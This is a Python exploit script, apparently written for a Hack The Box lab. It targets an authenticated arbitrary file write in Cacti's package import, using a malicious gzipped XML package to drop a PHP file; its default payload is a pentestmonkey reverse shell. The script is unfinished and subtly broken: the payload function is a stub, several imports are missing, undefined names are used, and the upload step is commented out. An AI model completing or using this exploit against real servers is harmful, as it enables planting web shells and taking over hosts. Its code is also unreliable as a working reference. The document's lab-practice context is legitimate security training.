#!/usr/bin/env python3

'''
Author: Declan Middleton
License: MIT
github: https://github.com/declanmiddleton
linkedin: https://www.linkedin.com/in/declanmiddleton/
youtube: https://youtube.com/@declanmidd
HackTheBox: declanmiddleton

Made for MonitorsThree HTB

The vulnerability is an improper input validation and arbitrary file write issue in the import_package() function within the /lib/import.php script. The function blindly trusts the filenames and content provided in a specially crafted XML data file within a compressed package (.xml.gz), and writes them to the web server's file system, potentially outside the intended directory due to lack of path traversal filtering.

An attacker must be an authenticated user and have the "Import Templates" permission to exploit this vulnerability. By crafting a malicious package that includes an embedded PHP file and uploading it via the "Package Import" feature
'''

import os
import ssl
import argparse
import urllib3
import certifi
from bs4 import BeautifulSoup

banner = '''
░▀█▀░█░█░█▀█░█▀▄░█▀█░░░░█▀▄░█▀▄░█▀█░█▀█
░░█░░█▀█░█░█░█▀▄░█░█░░░░█░█░█▀▄░█░█░█▀▀
░░▀░░▀░▀░▀▀▀░▀░▀░▀░▀░░░░▀▀░░▀░▀░▀▀▀░▀░░
'''
print(banner)

if __name__ == '__main__':
    cli_parser = argparse.ArgumentParser(
        epilog='''Examples:
                ./thorn.py http://localhost/cacti admin password
                ./thorn.py -p './php/rev.php' http://localhost/cacti admin password''',
        formatter_class=argparse.RawTextHelpFormatter
    )
    cli_parser.add_argument('URL',type=str,help='Cacti URL')
    cli_parser.add_argument('username',type=str,help='Login username')
    cli_parser.add_argument('password',type=str,help='Login password')
    cli_parser.add_argument('-p','--payload',type=str,help='Path to the PHP payload file (default: `./payload/shell.php` is a reverse shell created by pentestmonkey, Don\'t forget to change the ip & port)',default='./payload/shell.php')
    args = cli_parser.parse_args()

    URL = args.URL
    username = args.username
    password = args.password
    filename = args.payload

cacti_url = URL

proxy_url = 'http://127.0.0.1:8080' 
# HTTP setup
# http = urllib3.ProxyManager(
#     proxy_url, 
#     cert_reqs=ssl.CERT_NONE, 
#     assert_hostname=False
# )
http = urllib3.ProxyManager(proxy_url)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = http.request('GET', cacti_url)

def payload():
    # setup malicous gzip
    print('[*] Setting up malicous gzip')

    dest_filename = ''.join(random.choices(string.ascii_lowercase, k=16)) + '.php'
    print("[*] Creating the gzip...")
    xmldata = """<xml>
    <files>
        <file>
            <name>resource/{}</name>
            <data>{}</data>
            <filesignature>{}</filesignature>
        </file>
    </files>
    <publickey>{}</publickey>
    <signature></signature>
    </xml>"""

    pass

def check_cacti_version(session):
    print('[*] Checking cacti version')
    try:
        resp = session.data()
        print(f"Status: {resp.status}")
    
        if 'Cacti CHANGELOG' in resp and '1.2.26' not in r:
            print('[+] Valid version!')
        else:
            print('[-] Invalid version, not going to work..')
   
    except urllib3.exceptions.ProxyError as e:
        print(f"Proxy Error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")


def auth_login():
    print('[*] Version seems to be valid, proceeding to login')
    auth = urllib.request.HTTPBasicAuthHandler()
    auth.add_password(
        realm='Cacti',
        uri=cacti_url,
        user=username,
        passwd=password
    )
    opener = urllib.request.build_opener(auth)
    urllib.request.install_opener(opener)

    with urllib.request.urlopen(cacti_url) as f:
        print(f.read().decode('utf-8'))




check = check_cacti_version(cacti_url + "/CHANGELOG")

if check == False:
    sys.exit(0)
    
if session.status == 404:
    print('[#] Not found')    
    sys.exit(0)
else:
    check_cacti_version(session)
    

# print('[*] Uploading payload')

# soup = BeautifulSoup(r.text)

# data = {
#     '__csrf_magic': csrf,
#     'action': 'login',
#     'login_username': username,
#     'login_password': password,
#     'remember_me': 'on'
# }
